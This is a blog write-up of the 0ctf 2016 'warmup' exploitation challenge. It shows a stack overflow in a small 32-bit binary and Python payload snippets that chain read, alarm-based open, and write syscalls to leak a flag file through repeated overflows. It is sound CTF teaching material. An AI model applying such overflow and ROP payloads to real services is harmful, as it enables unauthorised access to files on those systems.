<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="0ctf 2016 - Warmup write-up" prefix="og: http://ogp.me/ns#" property=og:title><meta content="0ctf 2016 - Warmup write-up - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-03-14-0ctf-2016-warmup-write-up property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="0ctf 2016 - Warmup write-up - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-03-14-0ctf-2016-warmup-write-up name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-03-14-0ctf-2016-warmup-write-up",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": 0ctf 2016 - Warmup write-up - by hugsy",
      
    }
    </script><title>
  0ctf 2016 - Warmup write-up
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>0ctf 2016 - Warmup write-up</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 14 March 2016 <br> <br> <i>Reading time: 6 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>I participated to <a rel="noopener nofollow noreferrer" href=https://ctftime.org/team/4419/ target=_blank>0ctf</a> but only had time to play for the reversing challenge <code>trace</code> (write-up coming up soon) during the competition time.<p>I did this challenge only for fun after the CTF was over so I do not know the flag, and since I found it interesting, I decided to write a quick write-up.<p>And kudos to all teams who solved it !<h3 id=info>Info</h3><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  !file ./warmup
</span><span style=color:#bf616a>./warmup:</span><span> ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> statically linked, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=c1791030f336fcc9cda1da8dc3a3f8a70d930a11, stripped
</span><span style=color:#bf616a>gef➤</span><span>  checksec warmup
</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>warmup</span><span>'
</span><span style=color:#bf616a>Canary:</span><span>                                           No
</span><span style=color:#bf616a>NX</span><span> Support:                                       Yes
</span><span style=color:#bf616a>PIE</span><span> Support:                                      No
</span><span style=color:#bf616a>RPATH:</span><span>                                            No
</span><span style=color:#bf616a>RUNPATH:</span><span>                                          No
</span><span style=color:#bf616a>Partial</span><span> RelRO:                                    No
</span><span style=color:#bf616a>Full</span><span> RelRO:                                       No
</span></code></pre><p>Pretty stripped down file, very small (which seemed weird for a statically linked file). Stack canary and PIE are not on, but NX is.<h3 id=vulnerability>Vulnerability</h3><p>The binary is really small, does not do much either, so the vulnerability is quite easy to find and trigger.</p><a href=https://i.imgur.com/jpU2YsD.png target=_blank> <img alt=vuln src=https://i.imgur.com/jpU2YsD.png title=vuln width=100%> </a><p>At 0x08048174, We have a <code>read(socket, buffer, 52)</code> where buffer can only contain 32 bytes, so we have a classic stack overflow. A part of the challenge is however due to the fact that our controlled part is quite limited (i.e. 52-32=20 bytes=5 DWORD).<h3 id=exploitation>Exploitation</h3><p>In addition to not having a lot of gadgets (the source was written in pure assembly), no libc, etc. 0ctf organizers added that<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>notice: This service is protected by a sandbox, you can only read the flag at /home/warmup/flag
</span></code></pre><p>Meaning: we cannot simply write <code>/bin/sh</code> somewhere in memory, set <code>eax</code> to 11 and simply use a gadget to set <code>ebx</code>, <code>ecx</code>, <code>edx</code> to value loaded from the stack. We have to go all the way to open, read, write back the value of the flag located in <code>/home/warmup/flag</code>.<p>This lead to a much funkier way to exploit.<h4 id=objective>Objective</h4><p>The objective here seems pretty straight forward. We need to :<ol><li>Write <code>/tmp/flag</code> in a predictable and writable location ( anywhere in the <code>.data</code> section will do just fine).<li>Forge a <code>sys_open(flag, RWX)</code> gadget<li>Forge a <code>sys_read(fd, another_writeable_location, 50)</code> gadget<li>Forge a <code>sys_write(socket, another_writeable_location, 50)</code></ol><p>And it is done! In theory it seems pretty easy, but it took me a few hours (never underestimate a challenge ☺).<h4 id=interesting-gadgets>Interesting gadgets</h4><p>What the binary provides us with are gadgets to read and write:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>--read
</span><span style=color:#bf616a>.text:0804811D</span><span>                 mov     eax, 3
</span><span style=color:#bf616a>.text:08048122</span><span>                 mov     ebx, </span><span style=color:#b48ead>[</span><span>esp+fd</span><span style=color:#b48ead>]   </span><span>; </span><span style=color:#bf616a>fd
</span><span style=color:#bf616a>.text:08048126</span><span>                 mov     ecx, </span><span style=color:#b48ead>[</span><span>esp+addr</span><span style=color:#b48ead>] </span><span>; </span><span style=color:#bf616a>addr
</span><span style=color:#bf616a>.text:0804812A</span><span>                 mov     edx, </span><span style=color:#b48ead>[</span><span>esp+len</span><span style=color:#b48ead>]  </span><span>; </span><span style=color:#bf616a>len
</span><span style=color:#bf616a>.text:0804812E</span><span>                 int     80h             ; </span><span style=color:#bf616a>LINUX</span><span> - sys_read
</span><span>
</span><span style=color:#bf616a>--write
</span><span style=color:#bf616a>.text:08048135</span><span>                 mov     eax, 4
</span><span style=color:#bf616a>.text:0804813A</span><span>                 mov     ebx, </span><span style=color:#b48ead>[</span><span>esp+fd</span><span style=color:#b48ead>]   </span><span>; </span><span style=color:#bf616a>fd
</span><span style=color:#bf616a>.text:0804813E</span><span>                 mov     ecx, </span><span style=color:#b48ead>[</span><span>esp+addr</span><span style=color:#b48ead>] </span><span>; </span><span style=color:#bf616a>addr
</span><span style=color:#bf616a>.text:08048142</span><span>                 mov     edx, </span><span style=color:#b48ead>[</span><span>esp+len</span><span style=color:#b48ead>]  </span><span>; </span><span style=color:#bf616a>len
</span><span style=color:#bf616a>.text:08048146</span><span>                 int     80h             ; </span><span style=color:#bf616a>LINUX</span><span> - sys_write
</span></code></pre><p>Where the arguments are read from the limited stack we control.<p>However, we do not have an <code>sys_open</code> gadget, but since we can control <code>ebx</code> from the stack, all we need is to find a way to set <code>eax</code> to <a rel="noopener nofollow noreferrer" href=https://raw.githubusercontent.com/torvalds/linux/master/arch/x86/entry/syscalls/syscall_32.tbl target=_blank>5</a><p>My original intention was to force a call to <code>sys_read</code> from our socket, and send 5 bytes of junk data so that the syscall can return with the right value in <code>eax</code>. Unfortunately, we do not have enough space in our stack to chain correctly our <code>read</code> arguments, then jump into it and finally jump back to our next gadget ☹ .<p>After quite some time, I realized that <code>warmup</code> starts by initializing an alarm for 10 seconds (which when <code>SIGALRM</code> is received, will kill the program).<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:0804810D</span><span>                 mov     eax, 27
</span><span style=color:#bf616a>.text:08048112</span><span>                 mov     ebx, </span><span style=color:#b48ead>[</span><span>esp+seconds</span><span style=color:#b48ead>] </span><span>; </span><span style=color:#bf616a>seconds
</span><span style=color:#bf616a>.text:08048116</span><span>                 int     80h             ; </span><span style=color:#bf616a>LINUX</span><span> - sys_alarm
</span></code></pre><p>Nevertheless, this could be valuable to us, because RTFM:<blockquote><pre style=color:#c0c5ce;background-color:#2b303b><code><span>  alarm()  returns  the number of seconds remaining until any previously
</span><span>  scheduled alarm was due to be delivered, or zero if there was no
</span><span>  previously scheduled alarm.
</span></code></pre></blockquote><p>That means that if we jump a second time into the gadget @0x0804810D (i.e. call <code>alarm()</code> a second time), <code>eax</code> will be populated with whatever time is left before SIGALRM is issued! And since <code>alarm()</code> can take any integer as argument, our syscall will not return as an error! So by sleeping 5 seconds, <code>sys_alarm</code> will return with <code>eax</code> set to <code>NR_sys_open</code> (5), and we can use the stack to populate the other registers required for <code>sys_open</code>!<h4 id=attack>Attack</h4><p>Again, because of our limited space in the stack, we need to trigger the vulnerability multiple times. To do, we have to perform only one operation, then return to the original function (<code>0x0804815A</code>), and let the control flow repeat again until it re-hit our vulnerability.<p>So let’s go back to the steps we set in the <em>Objective</em> part for the exploitation part:<p>Writing <code>/tmp/flag</code> in a predictable and writable location can be done with the following gadgets:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    p = "</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>32
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(sys_read)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(ret_to_orginal_function) </span><span style=color:#65737e># ret back to vuln function
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#d08770>0</span><span>) </span><span style=color:#65737e># fd
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(writable_addr) </span><span style=color:#65737e># addr
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#96b5b4>len</span><span>(flag_path)) </span><span style=color:#65737e># len
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(p)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Good Luck!</span><span style=color:#96b5b4>\n</span><span>")
</span></code></pre><p>Now we have to sleep !! ☺<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    time.</span><span style=color:#bf616a>sleep</span><span>(</span><span style=color:#d08770>5</span><span>)
</span></code></pre><p>Now we can send our second payload, to call <code>alarm</code>, setting <code>eax</code> to <code>NR_sys_open</code>, and append the other arguments:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    p = "</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>32
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(sys_alarm)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(set_ebx_ecx_edx_int80)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(ret_to_orginal_function)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(writable_addr)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#d08770>7</span><span>) </span><span style=color:#65737e># READ|WRITE|EXECUTE
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(p)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Good Luck!</span><span style=color:#96b5b4>\n</span><span>")
</span></code></pre><p>We have now a file descriptor open to our flag file! Let’s read its content:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    p = "</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>32
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(sys_read)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(ret_to_orginal_function)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#d08770>5</span><span>) </span><span style=color:#65737e># file_fd
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(writable_addr2)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#d08770>20</span><span>)
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(p)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Good Luck!</span><span style=color:#96b5b4>\n</span><span>")
</span></code></pre><p>… And write it back to our socket (and exit cleanly, just because):<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    p = "</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>32
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(sys_write)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(sys_exit)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#d08770>1</span><span>) </span><span style=color:#65737e># fd stdout
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(writable_addr2)
</span><span>    p+= </span><span style=color:#bf616a>i_s</span><span>(</span><span style=color:#d08770>20</span><span>)
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(p)
</span></code></pre><p>This write-up does not give justice to the challenge, making it look easy. But it was not. I really like how you are made to create really inventive and neat technique for subverting existing calls to set up the structure the exact way you want it.<p>For those who want, the full exploit script is <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/8e31ddc61dba7d4e7c1f target=_blank>here</a>. But again, it was not tested against the game server.<p>Another good lesson to pay attention to details…<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/gef/>#gef</a> <a href=https://blahcat.github.io/tags/ida/>#ida</a> <a href=https://blahcat.github.io/tags/0ctf-2016/>#0ctf-2016</a> <a href=https://blahcat.github.io/tags/x86/>#x86</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=0ctf 2016 - Warmup write-up" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-03-22-bctf-16-ruin/> <section class=post-nav-teaser><b class=post-nav-title> BCTF 2016 - Ruin</b><p class=post-nav-excerpt>This is an ARM 32b exploitation challenge part of the BCTF competition, whi…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-03-08-bkpctf-2016-complex-calc/> <section class=post-nav-teaser><b class=post-nav-title>BKPCTF 2016 - Complex Calc</b><p class=post-nav-excerpt>The challenge is the sequel to simple_calc. If you haven’t read our write-u…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>